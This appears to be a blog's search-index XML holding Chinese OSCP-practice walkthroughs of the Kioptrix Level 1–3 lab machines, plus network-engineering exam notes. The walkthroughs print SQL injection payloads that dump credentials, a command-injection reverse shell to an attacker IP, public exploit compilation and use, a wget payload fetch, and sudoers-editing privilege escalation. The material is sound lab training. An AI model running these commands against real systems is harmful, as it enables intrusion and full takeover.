<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>0x03 - Kioptrix Level 3 SQL 注入 + sudo 提权</title>
      <link href="/eb32.html"/>
      <url>/eb32.html</url>
      
        <content type="html"><![CDATA[<h1 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.131 -A -oA nmap-results/attack</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION       </span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)           </span><br><span class="line">| ssh-hostkey:                                                                </span><br><span class="line">|   1024 30e3f6dc2e225d17ac460239ad71cb49 (DSA)                               </span><br><span class="line">|_  2048 9a82e696e47ed6a6d74544cb19aaecdd (RSA)                               </span><br><span class="line"></span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with Suhosin-Patch)                                                                </span><br><span class="line">|_http-title: Ligoat Security - Got Goat? Security ...                        </span><br><span class="line">| http-cookie-flags:     </span><br><span class="line">|   /:     </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.2</span>.<span class="number">8</span> (Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with Suhosin-Patch</span><br></pre></td></tr></table></figure><p>访问80端口</p><p><img src="/../images/0x03%20-%20Kioptrix%20Level%203%20SQL%20%E6%B3%A8%E5%85%A5%20+%20sudo%20%E6%8F%90%E6%9D%83231214.png"></p><p><img src="/../images/0x03%20-%20Kioptrix%20Level%203%20SQL%20%E6%B3%A8%E5%85%A5%20+%20sudo%20%E6%8F%90%E6%9D%83231214-2.png"></p><p>存在sql注入</p><p><img src="/../images/0x03%20-%20Kioptrix%20Level%203%20SQL%20%E6%B3%A8%E5%85%A5%20+%20sudo%20%E6%8F%90%E6%9D%83231214-3.png"></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 表名</span><br><span class="line">?id=1 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--+&amp;sort=photoid#photos</span><br><span class="line"></span><br><span class="line"># 列名</span><br><span class="line">?id=1 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_schema=database() and table_name=&#x27;dev_accounts&#x27;--+&amp;sort=photoid#photos</span><br><span class="line"></span><br><span class="line"># 数据</span><br><span class="line">?id=1 union select 1,group_concat(username,0x7e,password),3,4,5,6 from gallery.dev_accounts--+&amp;sort=photoid#photos</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># md5解密</span><br><span class="line">dreg/0d3eccfb887aabd50f243b3f155c0f85</span><br><span class="line">dreg/Mast3r</span><br><span class="line">loneferret/5badcaf789d3d1d09794d8f021f40f0e</span><br><span class="line">loneferret/starwars</span><br></pre></td></tr></table></figure><p>因为是有ssh的，尝试用这两个账号去登录</p><p><img src="/../images/0x03%20-%20Kioptrix%20Level%203%20SQL%20%E6%B3%A8%E5%85%A5%20+%20sudo%20%E6%8F%90%E6%9D%83231217.png"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查看有suid权限的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>登录另一个账号</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo -l</span><br><span class="line">User loneferret may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: !/usr/bin/su</span><br><span class="line">    (root) NOPASSWD: /usr/local/bin/ht</span><br></pre></td></tr></table></figure><p>发现可以使用高权限免密码的<code>ht</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置好这个环境，才可以打开ht</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-color</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/sudoers</code>文件</p><p><img src="/../images/0x03%20-%20Kioptrix%20Level%203%20SQL%20%E6%B3%A8%E5%85%A5%20+%20sudo%20%E6%8F%90%E6%9D%83231217-1.png"></p><p>添加<code>/bin/bash</code></p><p><img src="/../images/0x03%20-%20Kioptrix%20Level%203%20SQL%20%E6%B3%A8%E5%85%A5%20+%20sudo%20%E6%8F%90%E6%9D%83231217-2.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提权</span></span><br><span class="line">sudo bash</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> oscp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x02 - Kioptrix Level 2 简单的命令注入 + 内核提权</title>
      <link href="/bb69.html"/>
      <url>/bb69.html</url>
      
        <content type="html"><![CDATA[<h1 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.1/24 -sn --min-rate 2222 -R</span><br></pre></td></tr></table></figure><h1 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.129 -p- --min-rate 9999 -sS -PN -oA nmap_results/nmap_port</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">443/tcp  open  https</span><br><span class="line">631/tcp  open  ipp</span><br><span class="line">998/tcp  open  busboy</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure><h1 id="对端口指纹探测"><a href="#对端口指纹探测" class="headerlink" title="对端口指纹探测"></a>对端口指纹探测</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.129 -p 22,80,111,443,631,998,3306 -sV -sC -O --version-all -oA nmap_results/server_info</span><br></pre></td></tr></table></figure><h1 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h1><p><img src="/../images/0x02%20-%20Kioptrix%20Level%202%20%E7%AE%80%E5%8D%95%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%20+%20%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83231201.png"></p><p>使用sql注入的万能密码登录</p><p><img src="/../images/0x02%20-%20Kioptrix%20Level%202%20%E7%AE%80%E5%8D%95%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%20+%20%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83231201-2.png"></p><p>命令拼接，可以执行命令</p><p><img src="/../images/0x02%20-%20Kioptrix%20Level%202%20%E7%AE%80%E5%8D%95%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%20+%20%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83231201-3.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">192.168.1.130;bash -i &gt;&amp; /dev/tcp/192.168.1.128/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/../images/0x02%20-%20Kioptrix%20Level%202%20%E7%AE%80%E5%8D%95%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%20+%20%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83231201-5.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br><span class="line"><span class="comment"># 监听8888端口</span></span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>先去查看有没有什么计划任务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>查看拥有suid的权限，且可执行文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find -perm -u=s / -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">cat</span> /etc/*release*</span><br></pre></td></tr></table></figure><p><img src="/../images/0x02%20-%20Kioptrix%20Level%202%20%E7%AE%80%E5%8D%95%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%20+%20%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83231201-6.png"></p><h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><p>查找漏洞</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit Linux Kernel 2.6 CentOS</span><br><span class="line">searchsploit Linux Kernel 2.6 CentOS -m 9545</span><br></pre></td></tr></table></figure><p>将脚本上传到靶机，根据<code>9545.c</code>的源码提示进行编译，然后运行脚本，成功提权。</p>]]></content>
      
      
      <categories>
          
          <category> oscp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x01 - Kioptrix Level 1 古老的 Apache Vuln</title>
      <link href="/c241.html"/>
      <url>/c241.html</url>
      
        <content type="html"><![CDATA[<p>靶场列表<br><a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0">Fetching Title#jll6</a></p><h1 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.1/24 -sn --min-rate 2222 -R</span><br><span class="line"></span><br><span class="line">-sn: 不执行端口扫描。是一种 ping 扫描，只会尝试确定目标主机是否在线。</span><br><span class="line">--min-rate: 设置每秒发送的数据包的最小速率，设置为每秒 2222 个数据包。</span><br><span class="line">-R: 启用反向DNS查找。它将尝试查找目标IP地址的域名</span><br></pre></td></tr></table></figure><h1 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.129 -p- --min-rate 9999 -sS -PN -oA nmap_results/nmap_port</span><br><span class="line"></span><br><span class="line">-PN: Nmap将禁用主机发现，即使目标主机不响应ping请求，Nmap仍会尝试对其进行端口扫描</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">443/tcp  open  https</span><br><span class="line">1024/tcp open  kdm</span><br></pre></td></tr></table></figure><h1 id="对端口指纹探测"><a href="#对端口指纹探测" class="headerlink" title="对端口指纹探测"></a>对端口指纹探测</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 整合端口</span></span><br><span class="line"><span class="built_in">cat</span> nmap_port.nmap | grep open | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span></span><br><span class="line"><span class="comment"># 22,80,111,139,443,1024,</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.129 -p 22,80,111,139,443,1024 -sV -sC -O --version-all -oA nmap_results/server_info</span><br><span class="line"></span><br><span class="line">-sC: 启用默认脚本扫描</span><br><span class="line">-O: 启用操作系统检测</span><br><span class="line">--version-all: 尝试获取所有服务的版本信息，而不仅仅是开放的服务。</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1)</span><br><span class="line">|   1024 8f8e5b81ed21abc180e157a33c85c471 (DSA)</span><br><span class="line">|_  1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA)</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2            111/tcp   rpcbind</span><br><span class="line">|   100000  2            111/udp   rpcbind</span><br><span class="line">|   100024  1           1024/tcp   status</span><br><span class="line">|_  100024  1           1024/udp   status</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-09-26T09:32:06</span><br><span class="line">|_Not valid after:  2010-09-26T09:32:06</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_ssl-date: 2023-11-22T04:20:04+00:00; +1h01m51s from scanner time.</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:9A:80:72 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1h01m50s</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)</span><br></pre></td></tr></table></figure><h1 id="网站目录扫描"><a href="#网站目录扫描" class="headerlink" title="网站目录扫描"></a>网站目录扫描</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.1.129</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.129/manual/             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.129/mrtg/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.129/usage/</span><br></pre></td></tr></table></figure><h1 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit Apache httpd 1.3</span><br></pre></td></tr></table></figure><h3 id="PORT-139-SMB（enum4linux、smbclient）"><a href="#PORT-139-SMB（enum4linux、smbclient）" class="headerlink" title="PORT 139 SMB（enum4linux、smbclient）"></a>PORT 139 SMB（enum4linux、smbclient）</h3><p><code>enum4linux</code>枚举，<code>smbclient</code></p><blockquote><p>enum4linux是用于枚举windows和Linux系统上的SMB服务的工具。可以轻松的从与<strong>SMB服务</strong>有关的目标中快速提取信息</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux 192.168.1.129</span><br><span class="line"><span class="comment"># 发现有两个共享用户</span></span><br></pre></td></tr></table></figure><p><img src="/../images/0x01%20-%20Kioptrix%20Level%201%20%E5%8F%A4%E8%80%81%E7%9A%84%20Apache%20Vuln231124-3.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient --no-pass //192.168.1.129</span><br><span class="line">smbclient --no-pass //192.168.1.129/IPC$</span><br><span class="line">smbclient --no-pass //192.168.1.129/ADMIN$</span><br><span class="line">smbclient <span class="string">&quot;\\\\192.168.1.129\\IPC$&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探测到了共享：ADMIN$ ，可匿名登录但拒绝访问文件</span></span><br></pre></td></tr></table></figure><h3 id="SMB版本探测"><a href="#SMB版本探测" class="headerlink" title="SMB版本探测"></a>SMB版本探测</h3><p>服务枚举未探测扫samba的版本，使用<code>MSF</code>的<code>smb_version</code>模块探测版本信息。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6&gt; search smb_version</span><br><span class="line">msf6&gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf6&gt; <span class="built_in">set</span> rhosts 192.168.1.129</span><br><span class="line">msf6&gt; options</span><br><span class="line">msf6&gt; run</span><br></pre></td></tr></table></figure><blockquote><p>Unix (Samba 2.2.1a)</p></blockquote><h3 id="（CVE-2003-0201）Samba-RCE"><a href="#（CVE-2003-0201）Samba-RCE" class="headerlink" title="（CVE-2003-0201）Samba RCE"></a>（CVE-2003-0201）Samba RCE</h3><p>尝试Samba远程代码执行<code>Samba &lt; 2.2.8 （Linux/BSD）- Remote Code Excution</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba 2.2</span><br><span class="line">searchsploit samba -m 10</span><br><span class="line"></span><br><span class="line">gcc 10.c -o ./shellasroot</span><br><span class="line">./shellasroot -b 0 -v 192.168.1.129</span><br></pre></td></tr></table></figure><blockquote><p>成功拿到root</p></blockquote><h3 id="（CVE-2003-0201）Samba-trans2open溢出"><a href="#（CVE-2003-0201）Samba-trans2open溢出" class="headerlink" title="（CVE-2003-0201）Samba trans2open溢出"></a>（CVE-2003-0201）Samba trans2open溢出</h3><p><code>Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)</code></p><p>需要使用 MSF <code>exploit/linux/samba/trans2open</code>模块，设置 payload <code>linux/x86/shell_reverse_tcp</code></p><h3 id="（CVE-2002-0082）Apache-SSL远程缓冲溢出"><a href="#（CVE-2002-0082）Apache-SSL远程缓冲溢出" class="headerlink" title="（CVE-2002-0082）Apache SSL远程缓冲溢出"></a>（CVE-2002-0082）Apache SSL远程缓冲溢出</h3><p><code>Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Over</code></p><p>下载exp</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit Apache 1.3 -m 47080</span><br></pre></td></tr></table></figure><p>编译脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc 47080.c -o ssl_mod -lcrypto</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">如果编译的时候报openssl/ssl.h: No such fail</span><br><span class="line"></span><br><span class="line">apt-get install libssl-dev</span><br></pre></td></tr></table></figure><p><img src="/../images/0x01%20-%20Kioptrix%20Level%201%20%E5%8F%A4%E8%80%81%E7%9A%84%20Apache%20Vuln231124.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./ssl_mod 0x6b 192.168.1.129 443 -c 40</span><br></pre></td></tr></table></figure><p>成功拿到shell，但不是root</p><p><img src="/../images/0x01%20-%20Kioptrix%20Level%201%20%E5%8F%A4%E8%80%81%E7%9A%84%20Apache%20Vuln231124-1.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line"></span><br><span class="line">Linux version 2.4.7-10 (bhcompile@stripples.devel.redhat.com) (gcc version 2.96 20000731 (Red Hat Linux 7.1 2.96-98)) <span class="comment">#1 Thu Sep 6 16:46:36 EDT 2001</span></span><br></pre></td></tr></table></figure><p>发现获得apache权限时，会自动下载ptrace-kmod.c后gcc编译，提示没有找到文件。</p><p>kali中下载 <code>ptrace-kmod.c</code>到本地，查看注释是内核漏洞提权。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ptrace</span><br><span class="line"></span><br><span class="line">Linux Kernel 2.2.x/2.4.x (RedHat) - <span class="string">&#x27;ptrace/kmod&#x27;</span> Local Privilege  | linux/local/3.c</span><br></pre></td></tr></table></figure><p>使用python开启http服务将文件摆渡到靶机<code>/tmp</code>下，再次重新执行<code>./47080</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//kali</span><br><span class="line">python3 -m http.server --<span class="built_in">bind</span> 0.0.0.0 9000</span><br><span class="line"></span><br><span class="line">//靶机 apache权限</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.1.128:9000/ptrace-kmod.c</span><br><span class="line">gcc -o exploit ptrace-kmod.c -B /usr/bin</span><br><span class="line"><span class="built_in">chmod</span> +x exploit</span><br><span class="line"><span class="comment"># 一定要运行，我不知道为什么退出了就不可以，所以一定要在靶机里运行脚本</span></span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure><p><img src="/../images/0x01%20-%20Kioptrix%20Level%201%20%E5%8F%A4%E8%80%81%E7%9A%84%20Apache%20Vuln231124-2.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据通信</title>
      <link href="/38cd.html"/>
      <url>/38cd.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>模拟通信：信源产生是<strong>模拟数据</strong>，以模拟信号传输<br>数字通信：信源产生是<strong>模拟数据</strong>，以数字信号传输<br>数据通信：信源产生是<strong>数字数据</strong>，以任何方式传输</p><h1 id="信道特性"><a href="#信道特性" class="headerlink" title="信道特性"></a>信道特性</h1><h2 id="信道带宽"><a href="#信道带宽" class="headerlink" title="信道带宽"></a>信道带宽</h2><p>模拟信道的带宽：<br>W &#x3D; f2 - f1（单位：HZ）<br>信道能通过的最高频率f2 - 最低频率f1</p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231024.png"><br><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231024-1.png"></p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231024-2.png"></p><p>香农定理<br><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231024-3.png"></p><h2 id="误码率"><a href="#误码率" class="headerlink" title="误码率"></a>误码率</h2><p>定义：传输二进制位时出现差错的概率<br>公式：<br><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231024-4.png"></p><h2 id="信道延迟"><a href="#信道延迟" class="headerlink" title="信道延迟"></a>信道延迟</h2><p>定义：信号在信道中从发送端到接收端传输所需要的时间<br>产生：距离和传输速度<br>应用：电缆中信号的传输速度：200m&#x2F;us；卫星的通信时延：270ms</p><p>数据传输延迟时间 &#x3D; 两地距离 &#x2F; 传输速度<br>数据接收时间 &#x3D; 发送数据 &#x2F; 数据速率<br>数据传输总时长 &#x3D; 延迟时间 + 接收时间</p><h1 id="传输介质"><a href="#传输介质" class="headerlink" title="传输介质"></a>传输介质</h1><h2 id="光缆"><a href="#光缆" class="headerlink" title="光缆"></a>光缆</h2><p><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231024-5.png"></p><h1 id="数据编码"><a href="#数据编码" class="headerlink" title="数据编码"></a>数据编码</h1><p>查分曼码，看两个相邻的波形：<br>波形相同，后一个波形表示0<br>波形不同，后一个波形表示1</p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231025.png"></p><h2 id="4B-5B编码"><a href="#4B-5B编码" class="headerlink" title="4B&#x2F;5B编码"></a>4B&#x2F;5B编码</h2><p>两级编码方案：将4bit数据编码成5bit符号 + 反向不归零码NRZ-I<br>优点：编码效率提高到80%，应用：100BASE-FX（100BASE-TX用PAM-5）</p><h2 id="8B-10B编码"><a href="#8B-10B编码" class="headerlink" title="8B&#x2F;10B编码"></a>8B&#x2F;10B编码</h2><p>将8bit数据分成两组（3bit+5bit），再编码成两组符号（4bit+6bit）<br>优点：8bit &#x2F; 10bit&#x3D;80%，应用：千兆以太网（1000BASE-T用PAM-5）</p><h2 id="64B-66B编码"><a href="#64B-66B编码" class="headerlink" title="64B&#x2F;66B编码"></a>64B&#x2F;66B编码</h2><p>将64bit数据编码成66bit符号。编码效率64&#x2F;66&#x3D;97%，用于千兆以太网</p><h1 id="数字调制技术"><a href="#数字调制技术" class="headerlink" title="数字调制技术"></a>数字调制技术</h1><p>把数字数据调制为模拟信号</p><p>调制原理：通过调制模拟载波信号的3个参数（幅度，频移和相移）来表示数字数据</p><h2 id="调制技术"><a href="#调制技术" class="headerlink" title="调制技术"></a>调制技术</h2><p>幅度键控（ASK）：有幅度表示1；无幅度表示0<br>频移键控（FSK）：频率高表示1；频率低表示0<br>相移键控（PSK）：2相位：正相表示1；反相表示0<br>正交幅度调制（QAM）：将ASK和PSK结合，进行复合调制。调制方法：幅度相同，相位差90°<br><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231025-1.png"></p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231025-2.png"></p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231025-4.png"></p><p><img src="/../images/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1231025-3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 软考网络工程师 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考网工 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>广域网</title>
      <link href="/b7df.html"/>
      <url>/b7df.html</url>
      
        <content type="html"><![CDATA[<h1 id="ADSL非对称数字用户线路"><a href="#ADSL非对称数字用户线路" class="headerlink" title="ADSL非对称数字用户线路"></a>ADSL非对称数字用户线路</h1><p>采用FDM（频分多路复用）技术，将电话线路分为语言、上行和下行三个独立信道，同时提供电话和上网服务<br>利用电话线连接ADSL Modem上网，最大传输距离<strong>5公里</strong><br>使用PPPOE认证协议，可以采用<strong>虚拟拨号接入和专线接入</strong></p><h1 id="HFC混合光纤同轴电缆"><a href="#HFC混合光纤同轴电缆" class="headerlink" title="HFC混合光纤同轴电缆"></a>HFC混合光纤同轴电缆</h1><p>利用CATV有线电视线路连接互联网。骨干用光缆，入户用同轴电缆<br>用户端连接设备为Cable Modem，局端管理设备为CMTS</p><h1 id="FTTx光纤接入系统"><a href="#FTTx光纤接入系统" class="headerlink" title="FTTx光纤接入系统"></a>FTTx光纤接入系统</h1><p>接入方式：点对点方式和点对多点方式<br>接入类型：包括FTTH光纤到户（使用范围最广），FTTP光纤到驻地等</p>]]></content>
      
      
      <categories>
          
          <category> 软考网络工程师 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考网工 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统</title>
      <link href="/437.html"/>
      <url>/437.html</url>
      
